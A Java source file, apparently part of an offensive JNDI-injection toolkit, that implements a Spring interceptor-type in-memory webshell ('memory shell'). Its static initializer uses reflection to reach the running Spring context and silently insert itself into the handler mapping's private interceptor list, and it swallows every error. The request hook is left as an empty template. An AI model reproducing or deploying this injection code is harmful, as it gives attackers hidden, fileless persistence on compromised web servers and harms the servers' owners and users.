package com.qi4l.jndi.template.memshell.spring;

import org.springframework.beans.BeansException;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

/**
 * Spring Interceptor型 内存马
 * @author nu1r
 */
public class SpringInterceptorMS extends HandlerInterceptorAdapter {

    static {
        try {
            Class<?> RequestContextUtils = Class.forName("org.springframework.web.servlet.support.RequestContextUtils");

            Method getWebApplicationContext;
            try {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("getWebApplicationContext", ServletRequest.class);
            } catch (NoSuchMethodException e) {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("findWebApplicationContext", HttpServletRequest.class);
            }
            getWebApplicationContext.setAccessible(true);

            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

            //从 requestMappingHandlerMapping 中获取 adaptedInterceptors 属性 老版本是 DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
            try {
                Class<?> RequestMappingHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
            } catch (BeansException e) {
                Class<?> DefaultAnnotationHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
            }

            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);

            //添加SpringInterceptorTemplate类到adaptedInterceptors
            adaptedInterceptors.add(new SpringInterceptorMS());
        } catch (Exception ignored) {
        }
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        return true;
    }
}
